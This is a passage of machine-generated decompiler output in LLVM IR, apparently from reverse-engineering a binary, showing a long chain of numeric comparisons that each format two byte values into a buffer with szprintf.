  %v8_cdfc = call i32 @szprintf(i32 %v2_cdd8, i32 ptrtoint ([14 x i8]* @global_var_20744.390 to i32), i32 %v4_cdfc, i32 %v6_cdfc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ce00

dec_label_pc_ce00:                                ; preds = %dec_label_pc_cdcc, %dec_label_pc_cdd8
  %v7_ce04 = icmp eq i32 %v2_a93c, 169
  br i1 %v7_ce04, label %dec_label_pc_ce0c, label %dec_label_pc_ce34

dec_label_pc_ce0c:                                ; preds = %dec_label_pc_ce00
  %v2_ce0c = ptrtoint i32* %stack_var_-36 to i32
  %v3_ce18 = load i8, i8* @global_var_2c601.66, align 1
  %v3_ce24 = load i8, i8* @global_var_2c602.67, align 1
  %v4_ce30 = sext i8 %v3_ce18 to i32
  %v6_ce30 = sext i8 %v3_ce24 to i32
  %v8_ce30 = call i32 @szprintf(i32 %v2_ce0c, i32 ptrtoint ([14 x i8]* @global_var_20754.392 to i32), i32 %v4_ce30, i32 %v6_ce30, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ce34

dec_label_pc_ce34:                                ; preds = %dec_label_pc_ce00, %dec_label_pc_ce0c
  %v7_ce38 = icmp eq i32 %v2_a93c, 171
  br i1 %v7_ce38, label %dec_label_pc_ce40, label %dec_label_pc_ce68

dec_label_pc_ce40:                                ; preds = %dec_label_pc_ce34
  %v2_ce40 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ce4c = load i8, i8* @global_var_2c601.66, align 1
  %v3_ce58 = load i8, i8* @global_var_2c602.67, align 1
  %v4_ce64 = sext i8 %v3_ce4c to i32
  %v6_ce64 = sext i8 %v3_ce58 to i32
  %v8_ce64 = call i32 @szprintf(i32 %v2_ce40, i32 ptrtoint ([14 x i8]* @global_var_20764.394 to i32), i32 %v4_ce64, i32 %v6_ce64, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ce68

dec_label_pc_ce68:                                ; preds = %dec_label_pc_ce34, %dec_label_pc_ce40
  %v7_ce6c = icmp eq i32 %v2_a93c, 172
  br i1 %v7_ce6c, label %dec_label_pc_ce74, label %dec_label_pc_ce9c

dec_label_pc_ce74:                                ; preds = %dec_label_pc_ce68
  %v2_ce74 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ce80 = load i8, i8* @global_var_2c601.66, align 1
  %v3_ce8c = load i8, i8* @global_var_2c602.67, align 1
  %v4_ce98 = sext i8 %v3_ce80 to i32
  %v6_ce98 = sext i8 %v3_ce8c to i32
  %v8_ce98 = call i32 @szprintf(i32 %v2_ce74, i32 ptrtoint ([14 x i8]* @global_var_20774.396 to i32), i32 %v4_ce98, i32 %v6_ce98, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ce9c

dec_label_pc_ce9c:                                ; preds = %dec_label_pc_ce68, %dec_label_pc_ce74
  %v7_cea0 = icmp eq i32 %v2_a93c, 173
  br i1 %v7_cea0, label %dec_label_pc_cea8, label %dec_label_pc_ced0

dec_label_pc_cea8:                                ; preds = %dec_label_pc_ce9c
  %v2_cea8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ceb4 = load i8, i8* @global_var_2c601.66, align 1
  %v3_cec0 = load i8, i8* @global_var_2c602.67, align 1
  %v4_cecc = sext i8 %v3_ceb4 to i32
  %v6_cecc = sext i8 %v3_cec0 to i32
  %v8_cecc = call i32 @szprintf(i32 %v2_cea8, i32 ptrtoint ([14 x i8]* @global_var_20784.398 to i32), i32 %v4_cecc, i32 %v6_cecc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ced0

dec_label_pc_ced0:                                ; preds = %dec_label_pc_ce9c, %dec_label_pc_cea8
  %v7_ced4 = icmp eq i32 %v2_a93c, 174
  br i1 %v7_ced4, label %dec_label_pc_cedc, label %dec_label_pc_cf04

dec_label_pc_cedc:                                ; preds = %dec_label_pc_ced0
  %v2_cedc = ptrtoint i32* %stack_var_-36 to i32
  %v3_cee8 = load i8, i8* @global_var_2c601.66, align 1
  %v3_cef4 = load i8, i8* @global_var_2c602.67, align 1
  %v4_cf00 = sext i8 %v3_cee8 to i32
  %v6_cf00 = sext i8 %v3_cef4 to i32
  %v8_cf00 = call i32 @szprintf(i32 %v2_cedc, i32 ptrtoint ([13 x i8]* @global_var_20794.400 to i32), i32 %v4_cf00, i32 %v6_cf00, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cf04

dec_label_pc_cf04:                                ; preds = %dec_label_pc_ced0, %dec_label_pc_cedc
  %v7_cf08 = icmp eq i32 %v2_a93c, 175
  br i1 %v7_cf08, label %dec_label_pc_cf10, label %dec_label_pc_cf38

dec_label_pc_cf10:                                ; preds = %dec_label_pc_cf04
  %v2_cf10 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cf1c = load i8, i8* @global_var_2c601.66, align 1
  %v3_cf28 = load i8, i8* @global_var_2c602.67, align 1
  %v4_cf34 = sext i8 %v3_cf1c to i32
  %v6_cf34 = sext i8 %v3_cf28 to i32
  %v8_cf34 = call i32 @szprintf(i32 %v2_cf10, i32 ptrtoint ([14 x i8]* @global_var_207a4.402 to i32), i32 %v4_cf34, i32 %v6_cf34, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cf38

dec_label_pc_cf38:                                ; preds = %dec_label_pc_cf04, %dec_label_pc_cf10
  %v7_cf3c = icmp eq i32 %v2_a93c, 176
  br i1 %v7_cf3c, label %dec_label_pc_cf44, label %dec_label_pc_cf6c

dec_label_pc_cf44:                                ; preds = %dec_label_pc_cf38
  %v2_cf44 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cf50 = load i8, i8* @global_var_2c601.66, align 1
  %v3_cf5c = load i8, i8* @global_var_2c602.67, align 1
  %v4_cf68 = sext i8 %v3_cf50 to i32
  %v6_cf68 = sext i8 %v3_cf5c to i32
  %v8_cf68 = call i32 @szprintf(i32 %v2_cf44, i32 ptrtoint ([14 x i8]* @global_var_207b4.404 to i32), i32 %v4_cf68, i32 %v6_cf68, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cf6c

dec_label_pc_cf6c:                                ; preds = %dec_label_pc_cf38, %dec_label_pc_cf44
  %v7_cf70 = icmp eq i32 %v2_a93c, 177
  br i1 %v7_cf70, label %dec_label_pc_cf78, label %dec_label_pc_cfa0

dec_label_pc_cf78:                                ; preds = %dec_label_pc_cf6c
  %v2_cf78 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cf84 = load i8, i8* @global_var_2c601.66, align 1
  %v3_cf90 = load i8, i8* @global_var_2c602.67, align 1
  %v4_cf9c = sext i8 %v3_cf84 to i32
  %v6_cf9c = sext i8 %v3_cf90 to i32
  %v8_cf9c = call i32 @szprintf(i32 %v2_cf78, i32 ptrtoint ([14 x i8]* @global_var_207c4.406 to i32), i32 %v4_cf9c, i32 %v6_cf9c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cfa0

dec_label_pc_cfa0:                                ; preds = %dec_label_pc_cf6c, %dec_label_pc_cf78
  %v7_cfa4 = icmp eq i32 %v2_a93c, 178
  br i1 %v7_cfa4, label %dec_label_pc_cfac, label %dec_label_pc_cfd4

dec_label_pc_cfac:                                ; preds = %dec_label_pc_cfa0
  %v2_cfac = ptrtoint i32* %stack_var_-36 to i32
  %v3_cfb8 = load i8, i8* @global_var_2c601.66, align 1
  %v3_cfc4 = load i8, i8* @global_var_2c602.67, align 1
  %v4_cfd0 = sext i8 %v3_cfb8 to i32
  %v6_cfd0 = sext i8 %v3_cfc4 to i32
  %v8_cfd0 = call i32 @szprintf(i32 %v2_cfac, i32 ptrtoint ([13 x i8]* @global_var_207d4.408 to i32), i32 %v4_cfd0, i32 %v6_cfd0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cfd4

dec_label_pc_cfd4:                                ; preds = %dec_label_pc_cfa0, %dec_label_pc_cfac
  %v7_cfd8 = icmp eq i32 %v2_a93c, 179
  br i1 %v7_cfd8, label %dec_label_pc_cfe0, label %dec_label_pc_d008

dec_label_pc_cfe0:                                ; preds = %dec_label_pc_cfd4
  %v2_cfe0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cfec = load i8, i8* @global_var_2c601.66, align 1
  %v3_cff8 = load i8, i8* @global_var_2c602.67, align 1
  %v4_d004 = sext i8 %v3_cfec to i32
  %v6_d004 = sext i8 %v3_cff8 to i32
  %v8_d004 = call i32 @szprintf(i32 %v2_cfe0, i32 ptrtoint ([13 x i8]* @global_var_207e4.410 to i32), i32 %v4_d004, i32 %v6_d004, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d008

dec_label_pc_d008:                                ; preds = %dec_label_pc_cfd4, %dec_label_pc_cfe0
  %v7_d00c = icmp eq i32 %v2_a93c, 180
  br i1 %v7_d00c, label %dec_label_pc_d014, label %dec_label_pc_d03c

dec_label_pc_d014:                                ; preds = %dec_label_pc_d008
  %v2_d014 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d020 = load i8, i8* @global_var_2c601.66, align 1
  %v3_d02c = load i8, i8* @global_var_2c602.67, align 1
  %v4_d038 = sext i8 %v3_d020 to i32
  %v6_d038 = sext i8 %v3_d02c to i32
  %v8_d038 = call i32 @szprintf(i32 %v2_d014, i32 ptrtoint ([13 x i8]* @global_var_207f4.412 to i32), i32 %v4_d038, i32 %v6_d038, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d03c

dec_label_pc_d03c:                                ; preds = %dec_label_pc_d008, %dec_label_pc_d014
  %v7_d040 = icmp eq i32 %v2_a93c, 181
  br i1 %v7_d040, label %dec_label_pc_d048, label %dec_label_pc_d070

dec_label_pc_d048:                                ; preds = %dec_label_pc_d03c
  %v2_d048 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d054 = load i8, i8* @global_var_2c601.66, align 1
  %v3_d060 = load i8, i8* @global_var_2c602.67, align 1
  %v4_d06c = sext i8 %v3_d054 to i32
  %v6_d06c = sext i8 %v3_d060 to i32
  %v8_d06c = call i32 @szprintf(i32 %v2_d048, i32 ptrtoint ([13 x i8]* @global_var_20804.414 to i32), i32 %v4_d06c, i32 %v6_d06c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d070

dec_label_pc_d070:                                ; preds = %dec_label_pc_d03c, %dec_label_pc_d048
  %v7_d074 = icmp eq i32 %v2_a93c, 182
  br i1 %v7_d074, label %dec_label_pc_d07c, label %dec_label_pc_d0a4

dec_label_pc_d07c:                                ; preds = %dec_label_pc_d070
  %v2_d07c = ptrtoint i32* %stack_var_-36 to i32
  %v3_d088 = load i8, i8* @global_var_2c601.66, align 1
  %v3_d094 = load i8, i8* @global_var_2c602.67, align 1
  %v4_d0a0 = sext i8 %v3_d088 to i32
  %v6_d0a0 = sext i8 %v3_d094 to i32
  %v8_d0a0 = call i32 @szprintf(i32 %v2_d07c, i32 ptrtoint ([13 x i8]* @global_var_20814.416 to i32), i32 %v4_d0a0, i32 %v6_d0a0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d0a4

dec_label_pc_d0a4:                                ; preds = %dec_label_pc_d070, %dec_label_pc_d07c
  %v7_d0a8 = icmp eq i32 %v2_a93c, 183
  br i1 %v7_d0a8, label %dec_label_pc_d0b0, label %dec_label_pc_d0d8

dec_label_pc_d0b0:                                ; preds = %dec_label_pc_d0a4
  %v2_d0b0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d0bc = load i8, i8* @global_var_2c601.66, align 1
  %v3_d0c8 = load i8, i8* @global_var_2c602.67, align 1
  %v4_d0d4 = sext i8 %v3_d0bc to i32
  %v6_d0d4 = sext i8 %v3_d0c8 to i32
  %v8_d0d4 = call i32 @szprintf(i32 %v2_d0b0, i32 ptrtoint ([13 x i8]* @global_var_20014.155 to i32), i32 %v4_d0d4, i32 %v6_d0d4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d0d8

dec_label_pc_d0d8:                                ; preds = %dec_label_pc_d0a4, %dec_label_pc_d0b0
  %v7_d0dc = icmp eq i32 %v2_a93c, 184
  br i1 %v7_d0dc, label %dec_label_pc_d0e4, label %dec_label_pc_d10c

dec_label_pc_d0e4:                                ; preds = %dec_label_pc_d0d8
  %v2_d0e4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d0f0 = load i8, i8* @global_var_2c601.66, align 1
  %v3_d0fc = load i8, i8* @global_var_2c602.67, align 1
  %v4_d108 = sext i8 %v3_d0f0 to i32
  %v6_d108 = sext i8 %v3_d0fc to i32
  %v8_d108 = call i32 @szprintf(i32 %v2_d0e4, i32 ptrtoint ([13 x i8]* @global_var_20824.419 to i32), i32 %v4_d108, i32 %v6_d108, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d10c

dec_label_pc_d10c:                                ; preds = %dec_label_pc_d0d8, %dec_label_pc_d0e4
  %v7_d110 = icmp eq i32 %v2_a93c, 185
  br i1 %v7_d110, label %dec_label_pc_d118, label %dec_label_pc_d140

dec_label_pc_d118:                                ; preds = %dec_label_pc_d10c
  %v2_d118 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d124 = load i8, i8* @global_var_2c601.66, align 1
  %v3_d130 = load i8, i8* @global_var_2c602.67, align 1
  %v4_d13c = sext i8 %v3_d124 to i32
  %v6_d13c = sext i8 %v3_d130 to i32
  %v8_d13c = call i32 @szprintf(i32 %v2_d118, i32 ptrtoint ([13 x i8]* @global_var_20834.421 to i32), i32 %v4_d13c, i32 %v6_d13c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d140

dec_label_pc_d140:                                ; preds = %dec_label_pc_d10c, %dec_label_pc_d118
  %v7_d144 = icmp eq i32 %v2_a93c, 186
  br i1 %v7_d144, label %dec_label_pc_d14c, label %dec_label_pc_d174

dec_label_pc_d14c:                                ; preds = %dec_label_pc_d140
  %v2_d14c = ptrtoint i32* %stack_var_-36 to i32
  %v3_d158 = load i8, i8* @global_var_2c601.66, align 1
  %v3_d164 = load i8, i8* @global_var_2c602.67, align 1
  %v4_d170 = sext i8 %v3_d158 to i32
  %v6_d170 = sext i8 %v3_d164 to i32
  %v8_d170 = call i32 @szprintf(i32 %v2_d14c, i32 ptrtoint ([14 x i8]* @global_var_20844.423 to i32), i32 %v4_d170, i32 %v6_d170, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d174

dec_label_pc_d174:                                ; preds = %dec_label_pc_d140, %dec_label_pc_d14c
  %v7_d178 = icmp eq i32 %v2_a93c, 187
  br i1 %v7_d178, label %dec_label_pc_d180, label %dec_label_pc_d1a8

dec_label_pc_d180:                                ; preds = %dec_label_pc_d174
  %v2_d180 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d18c = load i8, i8* @global_var_2c601.66, align 1
  %v3_d198 = load i8, i8* @global_var_2c602.67, align 1
  %v4_d1a4 = sext i8 %v3_d18c to i32
  %v6_d1a4 = sext i8 %v3_d198 to i32
  %v8_d1a4 = call i32 @szprintf(i32 %v2_d180, i32 ptrtoint ([14 x i8]* @global_var_20854.425 to i32), i32 %v4_d1a4, i32 %v6_d1a4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d1a8

dec_label_pc_d1a8:                                ; preds = %dec_label_pc_d174, %dec_label_pc_d180
  %v7_d1ac = icmp eq i32 %v2_a93c, 188
  br i1 %v7_d1ac, label %dec_label_pc_d1b4, label %dec_label_pc_d1dc

dec_label_pc_d1b4:                                ; preds = %dec_label_pc_d1a8
  %v2_d1b4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d1c0 = load i8, i8* @global_var_2c601.66, align 1
  %v3_d1cc = load i8, i8* @global_var_2c602.67, align 1
  %v4_d1d8 = sext i8 %v3_d1c0 to i32
  %v6_d1d8 = sext i8 %v3_d1cc to i32
  %v8_d1d8 = call i32 @szprintf(i32 %v2_d1b4, i32 ptrtoint ([14 x i8]* @global_var_20864.427 to i32), i32 %v4_d1d8, i32 %v6_d1d8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d1dc

dec_label_pc_d1dc:                                ; preds = %dec_label_pc_d1a8, %dec_label_pc_d1b4
  %v7_d1e0 = icmp eq i32 %v2_a93c, 189
  br i1 %v7_d1e0, label %dec_label_pc_d1e8, label %dec_label_pc_d210

dec_label_pc_d1e8:                                ; preds = %dec_label_pc_d1dc
  %v2_d1e8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d1f4 = load i8, i8* @global_var_2c601.66, align 1
  %v3_d200 = load i8, i8* @global_var_2c602.67, align 1
  %v4_d20c = sext i8 %v3_d1f4 to i32
  %v6_d20c = sext i8 %v3_d200 to i32
  %v8_d20c = call i32 @szprintf(i32 %v2_d1e8, i32 ptrtoint ([14 x i8]* @global_var_20874.429 to i32), i32 %v4_d20c, i32 %v6_d20c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d210

dec_label_pc_d210:                                ; preds = %dec_label_pc_d1dc, %dec_label_pc_d1e8
  %v7_d214 = icmp eq i32 %v2_a93c, 190
  br i1 %v7_d214, label %dec_label_pc_d21c, label %dec_label_pc_d244

dec_label_pc_d21c:                                ; preds = %dec_label_pc_d210
  %v2_d21c = ptrtoint i32* %stack_var_-36 to i32
  %v3_d228 = load i8, i8* @global_var_2c601.66, align 1
  %v3_d234 = load i8, i8* @global_var_2c602.67, align 1
  %v4_d240 = sext i8 %v3_d228 to i32
  %v6_d240 = sext i8 %v3_d234 to i32
  %v8_d240 = call i32 @szprintf(i32 %v2_d21c, i32 ptrtoint ([14 x i8]* @global_var_20884.431 to i32), i32 %v4_d240, i32 %v6_d240, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d244

dec_label_pc_d244:                                ; preds = %dec_label_pc_d210, %dec_label_pc_d21c
  %v7_d248 = icmp eq i32 %v2_a93c, 191
  br i1 %v7_d248, label %dec_label_pc_d250, label %dec_label_pc_d278

dec_label_pc_d250:                                ; preds = %dec_label_pc_d244
  %v2_d250 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d25c = load i8, i8* @global_var_2c601.66, align 1
  %v3_d268 = load i8, i8* @global_var_2c602.67, align 1
  %v4_d274 = sext i8 %v3_d25c to i32
  %v6_d274 = sext i8 %v3_d268 to i32
  %v8_d274 = call i32 @szprintf(i32 %v2_d250, i32 ptrtoint ([14 x i8]* @global_var_20894.433 to i32), i32 %v4_d274, i32 %v6_d274, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d278

dec_label_pc_d278:                                ; preds = %dec_label_pc_d244, %dec_label_pc_d250
  %v7_d27c = icmp eq i32 %v2_a93c, 192
  br i1 %v7_d27c, label %dec_label_pc_d284, label %dec_label_pc_d2ac

dec_label_pc_d284:                                ; preds = %dec_label_pc_d278
  %v2_d284 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d290 = load i8, i8* @global_var_2c601.66, align 1
  %v3_d29c = load i8, i8* @global_var_2c602.67, align 1
  %v4_d2a8 = sext i8 %v3_d290 to i32
  %v6_d2a8 = sext i8 %v3_d29c to i32
  %v8_d2a8 = call i32 @szprintf(i32 %v2_d284, i32 ptrtoint ([13 x i8]* @global_var_208a4.435 to i32), i32 %v4_d2a8, i32 %v6_d2a8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d2ac

dec_label_pc_d2ac:                                ; preds = %dec_label_pc_d278, %dec_label_pc_d284
  %v7_d2b0 = icmp eq i32 %v2_a93c, 193
  br i1 %v7_d2b0, label %dec_label_pc_d2b8, label %dec_label_pc_d2e0

dec_label_pc_d2b8:                                ; preds = %dec_label_pc_d2ac
  %v2_d2b8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d2c4 = load i8, i8* @global_var_2c601.66, align 1
  %v3_d2d0 = load i8, i8* @global_var_2c602.67, align 1
  %v4_d2dc = sext i8 %v3_d2c4 to i32
  %v6_d2dc = sext i8 %v3_d2d0 to i32
  %v8_d2dc = call i32 @szprintf(i32 %v2_d2b8, i32 ptrtoint ([13 x i8]* @global_var_208b4.437 to i32), i32 %v4_d2dc, i32 %v6_d2dc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d2e0

dec_label_pc_d2e0:                                ; preds = %dec_label_pc_d2ac, %dec_label_pc_d2b8
  %v7_d2e4 = icmp eq i32 %v2_a93c, 194
  br i1 %v7_d2e4, label %dec_label_pc_d2ec, label %dec_label_pc_d314

dec_label_pc_d2ec:                                ; preds = %dec_label_pc_d2e0
  %v2_d2ec = ptrtoint i32* %stack_var_-36 to i32
  %v3_d2f8 = load i8, i8* @global_var_2c601.66, align 1
  %v3_d304 = load i8, i8* @global_var_2c602.67, align 1
  %v4_d310 = sext i8 %v3_d2f8 to i32
  %v6_d310 = sext i8 %v3_d304 to i32
  %v8_d310 = call i32 @szprintf(i32 %v2_d2ec, i32 ptrtoint ([14 x i8]* @global_var_208c4.439 to i32), i32 %v4_d310, i32 %v6_d310, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d314

dec_label_pc_d314:                                ; preds = %dec_label_pc_d2e0, %dec_label_pc_d2ec
  %v7_d318 = icmp eq i32 %v2_a93c, 195
  br i1 %v7_d318, label %dec_label_pc_d320, label %dec_label_pc_d348

dec_label_pc_d320:                                ; preds = %dec_label_pc_d314
  %v2_d320 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d32c = load i8, i8* @global_var_2c601.66, align 1
  %v3_d338 = load i8, i8* @global_var_2c602.67, align 1
  %v4_d344 = sext i8 %v3_d32c to i32
  %v6_d344 = sext i8 %v3_d338 to i32
  %v8_d344 = call i32 @szprintf(i32 %v2_d320, i32 ptrtoint ([14 x i8]* @global_var_208d4.441 to i32), i32 %v4_d344, i32 %v6_d344, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d348

dec_label_pc_d348:                                ; preds = %dec_label_pc_d314, %dec_label_pc_d320
  %v7_d34c = icmp eq i32 %v2_a93c, 196
  br i1 %v7_d34c, label %dec_label_pc_d354, label %dec_label_pc_d37c

dec_label_pc_d354:                                ; preds = %dec_label_pc_d348
  %v2_d354 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d360 = load i8, i8* @global_var_2c601.66, align 1
  %v3_d36c = load i8, i8* @global_var_2c602.67, align 1
  %v4_d378 = sext i8 %v3_d360 to i32
  %v6_d378 = sext i8 %v3_d36c to i32
  %v8_d378 = call i32 @szprintf(i32 %v2_d354, i32 ptrtoint ([14 x i8]* @global_var_208e4.443 to i32), i32 %v4_d378, i32 %v6_d378, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d37c

dec_label_pc_d37c:                                ; preds = %dec_label_pc_d348, %dec_label_pc_d354
  %v7_d380 = icmp eq i32 %v2_a93c, 197
  br i1 %v7_d380, label %dec_label_pc_d388, label %dec_label_pc_d3b0

dec_label_pc_d388:                                ; preds = %dec_label_pc_d37c
  %v2_d388 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d394 = load i8, i8* @global_var_2c601.66, align 1
  %v3_d3a0 = load i8, i8* @global_var_2c602.67, align 1
  %v4_d3ac = sext i8 %v3_d394 to i32
  %v6_d3ac = sext i8 %v3_d3a0 to i32
  %v8_d3ac = call i32 @szprintf(i32 %v2_d388, i32 ptrtoint ([14 x i8]* @global_var_208f4.445 to i32), i32 %v4_d3ac, i32 %v6_d3ac, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d3b0

dec_label_pc_d3b0:                                ; preds = %dec_label_pc_d37c, %dec_label_pc_d388
  %v7_d3b4 = icmp eq i32 %v2_a93c, 198
  br i1 %v7_d3b4, label %dec_label_pc_d3bc, label %dec_label_pc_d3e4

dec_label_pc_d3bc:                                ; preds = %dec_label_pc_d3b0
  %v2_d3bc = ptrtoint i32* %stack_var_-36 to i32
  %v3_d3c8 = load i8, i8* @global_var_2c601.66, align 1
  %v3_d3d4 = load i8, i8* @global_var_2c602.67, align 1
  %v4_d3e0 = sext i8 %v3_d3c8 to i32
  %v6_d3e0 = sext i8 %v3_d3d4 to i32
  %v8_d3e0 = call i32 @szprintf(i32 %v2_d3bc, i32 ptrtoint ([14 x i8]* @global_var_20904.447 to i32), i32 %v4_d3e0, i32 %v6_d3e0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d3e4

dec_label_pc_d3e4:                                ; preds = %dec_label_pc_d3b0, %dec_label_pc_d3bc
  %v7_d3e8 = icmp eq i32 %v2_a93c, 199
  br i1 %v7_d3e8, label %dec_label_pc_d3f0, label %dec_label_pc_d418

dec_label_pc_d3f0:                                ; preds = %dec_label_pc_d3e4
  %v2_d3f0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d3fc = load i8, i8* @global_var_2c601.66, align 1
  %v3_d408 = load i8, i8* @global_var_2c602.67, align 1
  %v4_d414 = sext i8 %v3_d3fc to i32
  %v6_d414 = sext i8 %v3_d408 to i32
  %v8_d414 = call i32 @szprintf(i32 %v2_d3f0, i32 ptrtoint ([14 x i8]* @global_var_20914.449 to i32), i32 %v4_d414, i32 %v6_d414, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d418

dec_label_pc_d418:                                ; preds = %dec_label_pc_d3e4, %dec_label_pc_d3f0
  %v7_d41c = icmp eq i32 %v2_a93c, 200
  br i1 %v7_d41c, label %dec_label_pc_d424, label %dec_label_pc_d44c

dec_label_pc_d424:                                ; preds = %dec_label_pc_d418
  %v2_d424 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d430 = load i8, i8* @global_var_2c601.66, align 1
  %v3_d43c = load i8, i8* @global_var_2c602.67, align 1
  %v4_d448 = sext i8 %v3_d430 to i32
  %v6_d448 = sext i8 %v3_d43c to i32
  %v8_d448 = call i32 @szprintf(i32 %v2_d424, i32 ptrtoint ([14 x i8]* @global_var_20924.451 to i32), i32 %v4_d448, i32 %v6_d448, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d44c

dec_label_pc_d44c:                                ; preds = %dec_label_pc_d418, %dec_label_pc_d424
  %v7_d450 = icmp eq i32 %v2_a93c, 201
  br i1 %v7_d450, label %dec_label_pc_d48c, label %dec_label_pc_d480

dec_label_pc_d480:                                ; preds = %dec_label_pc_d44c
  br label %dec_label_pc_d4b4

dec_label_pc_d48c:                                ; preds = %dec_label_pc_d44c
  %v2_d458 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d464 = load i8, i8* @global_var_2c601.66, align 1
  %v3_d470 = load i8, i8* @global_var_2c602.67, align 1
  %v4_d47c = sext i8 %v3_d464 to i32
  %v6_d47c = sext i8 %v3_d470 to i32
  %v8_d47c = call i32 @szprintf(i32 %v2_d458, i32 ptrtoint ([14 x i8]* @global_var_20934.453 to i32), i32 %v4_d47c, i32 %v6_d47c, i32 ptrtoint (i32* @0 to i32))
  %v3_d498 = load i8, i8* @global_var_2c601.66, align 1
  %v3_d4a4 = load i8, i8* @global_var_2c602.67, align 1
  %v4_d4b0 = sext i8 %v3_d498 to i32
  %v6_d4b0 = sext i8 %v3_d4a4 to i32
  %v8_d4b0 = call i32 @szprintf(i32 %v2_d458, i32 ptrtoint ([13 x i8]* @global_var_20944.455 to i32), i32 %v4_d4b0, i32 %v6_d4b0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d4b4

dec_label_pc_d4b4:                                ; preds = %dec_label_pc_d480, %dec_label_pc_d48c
  %v7_d4b8 = icmp eq i32 %v2_a93c, 202
  br i1 %v7_d4b8, label %dec_label_pc_d4c0, label %dec_label_pc_d4e8

dec_label_pc_d4c0:                                ; preds = %dec_label_pc_d4b4
  %v2_d4c0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d4cc = load i8, i8* @global_var_2c601.66, align 1
  %v3_d4d8 = load i8, i8* @global_var_2c602.67, align 1
  %v4_d4e4 = sext i8 %v3_d4cc to i32
  %v6_d4e4 = sext i8 %v3_d4d8 to i32
  %v8_d4e4 = call i32 @szprintf(i32 %v2_d4c0, i32 ptrtoint ([13 x i8]* @global_var_20954.457 to i32), i32 %v4_d4e4, i32 %v6_d4e4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d4e8

dec_label_pc_d4e8:                                ; preds = %dec_label_pc_d4b4, %dec_label_pc_d4c0
  %v7_d4ec = icmp eq i32 %v2_a93c, 203
  br i1 %v7_d4ec, label %dec_label_pc_d4f4, label %dec_label_pc_d51c

dec_label_pc_d4f4:                                ; preds = %dec_label_pc_d4e8
  %v2_d4f4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d500 = load i8, i8* @global_var_2c601.66, align 1
  %v3_d50c = load i8, i8* @global_var_2c602.67, align 1
  %v4_d518 = sext i8 %v3_d500 to i32
  %v6_d518 = sext i8 %v3_d50c to i32
  %v8_d518 = call i32 @szprintf(i32 %v2_d4f4, i32 ptrtoint ([13 x i8]* @global_var_20964.459 to i32), i32 %v4_d518, i32 %v6_d518, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d51c

dec_label_pc_d51c:                                ; preds = %dec_label_pc_d4e8, %dec_label_pc_d4f4
  %v7_d520 = icmp eq i32 %v2_a93c, 204
  br i1 %v7_d520, label %dec_label_pc_d528, label %dec_label_pc_d550

dec_label_pc_d528:                                ; preds = %dec_label_pc_d51c
  %v2_d528 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d534 = load i8, i8* @global_var_2c601.66, align 1
  %v3_d540 = load i8, i8* @global_var_2c602.67, align 1
  %v4_d54c = sext i8 %v3_d534 to i32
  %v6_d54c = sext i8 %v3_d540 to i32
  %v8_d54c = call i32 @szprintf(i32 %v2_d528, i32 ptrtoint ([13 x i8]* @global_var_20974.461 to i32), i32 %v4_d54c, i32 %v6_d54c, i32 ptrtoint (i32* @0 to i32))
